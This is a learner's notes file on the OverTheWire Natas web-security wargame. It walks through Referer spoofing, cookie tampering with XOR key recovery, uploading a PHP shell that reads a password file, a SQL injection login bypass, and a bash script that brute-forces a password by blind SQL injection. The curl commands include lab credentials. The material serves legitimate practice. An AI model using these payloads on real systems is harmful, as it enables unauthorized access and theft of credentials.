#Lessons Learned for Natas

Every(most? many?) websites have a robots.txt which directs web robots
(like search engines) what they can and can't access. To get to it, type
/robots.txt   following the .com

ex.
google.com/robots.txt

```
User-agent: *
Disallow: /search
Allow: /search/about
Allow: /search/static
Allow: /search/howsearchworks
Disallow: /sdch
Disallow: /groups
Disallow: /index.html?
Disallow: /?
.
.
.
User-agent: facebookexternalhit
Allow: /imgres
```

this allows all (\*) User-agents (robots) to access things except
/sdch   or /group  or /index.html? etc.

User agent "facebookexternalhit" is allowed acces to /imgres 
(Which I assume is images?)






forcing a google search in your history
Make a 0x0 image in html code with the search as the src <br>
ex:<br>

```
<img src='https://www.google.com/search?q=Kittens+and+Pancakes' width=0 height=0>
```
but a close inspection would show there's a "Reffered to from..." attached






Referrer

A simple google chrome add on can be used to change where you've been 
referred from (change it, hide it, whatever)

OR can use curl:

```
curl 'http://natas4.natas.labs.overthewire.org/' \
        -H 'Referer: http://natas5.natas.labs.overthewire.org/' \
  -H 'Connection: keep-alive' \
  -H 'Cache-Control: max-age=0' \
  -H 'Authorization: Basic bmF0YXM0Olo5dGtSa1dtcHQ5UXI3WHJSNWpXUmtnT1U5MDFzd0Va' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Mobile Safari/537.36' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
  -H 'Accept-Language: en-US,en;q=0.9,fr;q=0.8,es;q=0.7' \
  --compressed \
  --insecure
```





## :::::::::::::::::::Cookies :::::::::::::::::::::::::::::::::

view and change cookies (with no add-on)

Ctrl-Shift-I for inpection, then choose "applications" tab, should be there
under "Storage" Refresh the page after making any changes.

Other sources:<br>
under chrome go to  
settings:advanced:content settings: cookies: all cookies and site data:
then find the website itself

NOTE: an '=' is changed to '%3D' (this is done for transport since '=' is
a reserved character)


## :::::::PHP stuff::::::::

```
--Includes--
<?

include "includes/secret.inc";
.
.
. blah blah php script
.
.
?>
```

The above indicates that a document "/includes/secret.inc" is being accesed
by the php, so adding it to the url should reveal it



Look at this php script (for 10 -->11)

```
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);

?>
.
.
.
<?
if($data["showpassword"] == "yes") {
    print "The password for natas12 is <censored><br>";
}

?>
```

Analyzing the bottom, we know if showpassword = yes then we will see it.
The cookie is XOR encoded, so we can't simply do 'ctrl-shift-j' and type
" document.cookie = "data='showpassword'=>'yes', 'bgcolor'=>'#ffffff' "

we have to send that but XOR encrypted (well, first json encoded, then 
xor encrypted then base64 encoded according to the php script)

We also need to get the XOR encryption key. knowing that A ^ B = C
Thn A ^ C = B, meaning that since "message ^ key = ecryptedmessage"
then "message ^ encryptedmessage = key"

Since we can view cookies to see the encrypted message and we see what the
message is in the php script, we can work backwards to get the key, then 
encode our "showpassword => yes...." stuff 
(See xorencrypt.php for script)


python variant of php script:
```python
import base64
encoded = '3d3d516343746d4d6d6c315669563362'
print(base64.b64decode((bytes.fromhex(encoded))[::-1]))
```


## ::::::: Preview a Change in Cookies (if you can't physically change it :::::
set/preview a cookie in javascript in the browser (10 ->11)

press "ctrl-shift-j" to bring up the javscript console
type the following (or whatever cookie is pertinent to the situation)

document.cookie = "data=ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK";

then refresh


12 -> 13

```php
<? 

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";    

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>

<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
```

One thing that stuck out is that genRandomString() is called twice. First initially in the hidden input part of the form, then by makeRandomPath(). That stood out as odd. It was not immediately evident where the next passcode was. But if you follow the chain (`if array_key_exists("filename",$_POST)...` that filename (which is the first randomly generated one) is passed through. Most particularly that extension is passed through. This means it doesn't matter what filetype is uploaded, it will take on that random string and appended ".jpg" file extension.

Anyway, this code just appears to check that filename exists (which is true after a file is chosen) then it generates a different random string and appends that .jpg to it as described above, so even if you choose to upload a php script, it won't be executed (I assume the browser is reliant on that file extension).

My strategy was to upload my php script (`<?php system('cat /etc/natas_webpass/natas13'); ?>` ) then before clicking submit, opening up the dev tools and changing the 1st rando file extension to ".php". Admittedly, I didn't fully figure this out on my own.

my friend did the same with this curl command:
```sh
curl 'http://natas12.natas.labs.overthewire.org/index.php' \
  -X 'POST' \
  -H 'Authorization: Basic bmF0YXMxMjpFRFhwMHBTMjZ3TEtIWnkxckRCUFVaazBSS2ZMR0lSMw==' \
  -H 'Content-Type: multipart/form-data' \
  -F 'filename=whatever.php' \
  -F 'uploadedfile=@get_pass.php;' \
```

From here visit the site or be cool and get it with curl again (don't forget to add te authorization block)

`curl http://natas12.natas.labs.overthewire.org/upload/imx0qbstyu.php -H 'Authorization: Basic bmF0YXMxMjpFRFhwMHBTMjZ3TEtIWnkxckRCUFVaazBSS2ZMR0lSMw=='`

13 -> 14

The same except it has a line to check filetype. The php that accomplishes this is
```php 
else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
```
The way this appears to work is by checking the "magic" hex codes in the front which indicate filetype. [There are many](https://en.wikipedia.org/wiki/List_of_file_signatures),here's one for jpg: `FF D8 FF EE`. A command line tool called simply `hexeditor` can be used to add these 4 to the front (`hexeditor -b <file>` to open in buffer mode from which new byes can be added with ctrl-A)


## :::::::::::::: SQL inection ::::::::::::::::

Here's a php script that references a MySQL database:

```php
<?
if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas14', '<censored>');
    mysql_select_db('natas14', $link);
    
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysql_num_rows(mysql_query($query, $link)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    mysql_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password"><br>
<input type="submit" value="Login" />
</form>
```

focusing in on the query:
`"SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\""`

cleaning it up a little, this is what it will appear based on the form's input (NOTE: I'm not sure why they're being stored in `$_REQUEST` instead of `$_POST`, one of the peculiarities I'm not aware of in php)

`SELECT * from users where username="<username>" and password="<password>"`

Notice the quotes. So knowing a little bit of SQL, I know the syntax. I probably can't guess the username and even more likely wouldn't be able to also guess the password, so my strategy is to put the following in the username of the form (keeping password blank is fine)

`" OR 1 #`

This way, the query above reads

`SELECT * from users where username="" OR 1 # and password=""`

So "get me everything from the database where the username is "" or True". One of these is going to be true, either the usernamwe being blank or simply TRUE = True, so we're dandy.



another:

```php
<?

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas15', '<censored>');
    mysql_select_db('natas15', $link);
    
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysql_query($query, $link);
    if($res) {
    if(mysql_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysql_close($link);
} else {
?>
```

Here a textboox just checks for the existance of the username by passing it to the query: `"SELECT * from users where username="<username"`

WRONG DIRECTION:

I focused too much on the later `if(array_key_exists("debug", $_GET))`. I found out you can't make a POST and GET simultaneously, but hitting submit makes a POST, so how do you pass variables into a GET? adding `?debug=1` to the URL didn't cut it. Instead opening dev tools and adding to the form tag `action="?debug=1`. I was hoping there would be something deeper. I also tried to do some php injection by doing something like `natas16" ; echo $ref; "` my hope with this is that the result would put the following code "SELECT * from users where username=natas16"; echo $ref;" So that the query would be sucessful, later on when res was defined (to be the results) it would show me the results. But all my attempts would just be sanitized out. I didn't figure out what to do on my own, but my friend looked up the solution hint, I caved and asked for it as well and heard it was a brute force SQL. 

If the password started with an A for example, then you could put the following:

`natas16" and password like "A%` --> `"SELECT * from users where username="natas16" and password like "A%"`. This would show the user exists. We actually see hinted that the password can be up to a 64 char alphanumeric (VARCHAR) string, so making a post request with a bash script works:

```bash
front=''
for n in {1..65}
do
        change=0
        echo "on round $n:"
        for l in {a..z} {A..Z} {0..9}
        do
                curl -s 'http://natas15.natas.labs.overthewire.org/index.php' \
  -H 'Authorization: Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==' \
  --data-raw 'username=natas16%22++and+password+like+binary+%22'$front$l'%25' \ > output.txt
                  if grep -q "user exists." output.txt
                  then
                          front+=$l # Append new successful char to beginning
                          change=1
                          echo "found new char: $l -- $front"
                          break # break out of loop early
                  fi
        done
        # Break when no changes to password is found
        if [ $change == 0 ]; then echo "final -->> $front <<-- PIAZZA!"; break; fi
done
```

(it's LIKE BINARY instead of LIKE because it makes a stronger distinguishment between capital and lower case, but details...)
